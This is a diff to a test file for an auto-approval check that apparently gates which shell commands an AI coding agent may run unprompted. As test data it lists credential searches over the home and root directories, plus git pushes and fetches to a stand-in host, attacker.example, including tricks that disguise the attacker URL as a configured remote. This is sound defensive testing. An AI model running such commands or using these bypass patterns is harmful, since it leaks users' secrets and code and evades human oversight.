@@ -104,6 +104,43 @@ describe('assessAutoApproval — the commands from a real session', () => {
   })
 })
 
+describe('assessAutoApproval — operands the scope analyzer scores as contained', () => {
+  // A bare `~`, `/` or `..` has no separator for the analyzer to key on, so the
+  // segment reads as `sandbox`. Auto-approval runs the line outside the sandbox.
+  it('refuses a read of the home directory, the root or the parent directory', () => {
+    for (const command of [
+      'git fetch origin && grep -r KEY ~',
+      'git fetch origin; ls -la ~',
+      'git fetch origin && rg token ~+',
+      'git fetch origin && cat -- ~',
+      'git fetch origin && grep -r KEY /',
+      'git fetch origin && ls ..',
+      'git fetch origin && grep -r KEY ./..',
+      'git fetch origin && grep --file=~ x',
+      'git fetch origin && ls --directory=..',
+      'git fetch origin && git diff --no-index ~ .',
+      'git fetch origin && git grep --no-index KEY -- ..',
+      // `-m` takes a value only on `git commit`.
+      'git fetch origin && git diff --no-index -m ~ .',
+      'grep -r KEY ~',
+      'ls /',
+    ]) {
+      prompts(command, 'remote-write')
+    }
+  })
+
+  it('still approves ordinary operands, refs and commit messages', () => {
+    assert.equal(approved('git fetch origin && grep -rn TODO src', 'read'), 'read')
+    assert.equal(approved('git fetch origin && ls -la . src/..', 'read'), 'read')
+    assert.equal(approved('git fetch origin && git log HEAD~3..HEAD', 'read'), 'read')
+    assert.equal(approved('git fetch origin && git diff main..', 'read'), 'read')
+    // A search pattern the scope analyzer already reads as text.
+    assert.equal(approved('git fetch origin && grep -v "//" src/a.ts', 'read'), 'read')
+    assert.equal(approved('git commit -m "~10% faster"', 'local-write'), 'local-write')
+    assert.equal(approved('git commit --message=..', 'local-write'), 'local-write')
+  })
+})
+
 describe('assessAutoApproval — network commands need a configured remote', () => {
   it('accepts a configured remote name', () => {
     assert.equal(approved('git fetch upstream', 'read', ['origin', 'upstream']), 'read')
@@ -119,6 +156,18 @@ describe('assessAutoApproval — network commands need a configured remote', () 
     prompts('git push https://attacker.example/repo main', 'remote-write')
     prompts('git push git@attacker.example:me/repo.git main', 'remote-write')
     prompts('git ls-remote https://attacker.example/repo', 'read')
+  })
+
+  it('requires the remote to be the first argument, where git reads the repository', () => {
+    // git takes the first positional as the repository and the rest as refspecs,
+    // so a configured name after an scp-style URL is only a branch called `origin`.
+    prompts('git push git@attacker.example:me/repo.git origin', 'remote-write')
+    prompts('git push attacker.example:repo origin main', 'remote-write')
+    prompts('git fetch attacker.example:repo origin', 'read')
+    prompts('git ls-remote attacker.example:repo origin', 'read')
+    prompts('git push main origin', 'remote-write')
+    assert.equal(approved('git push origin origin', 'remote-write'), 'remote-write')
+    assert.equal(approved('git push -u origin feature', 'remote-write'), 'remote-write')
   })
 
   it('allows the implicit-upstream form only when remotes exist', () => {
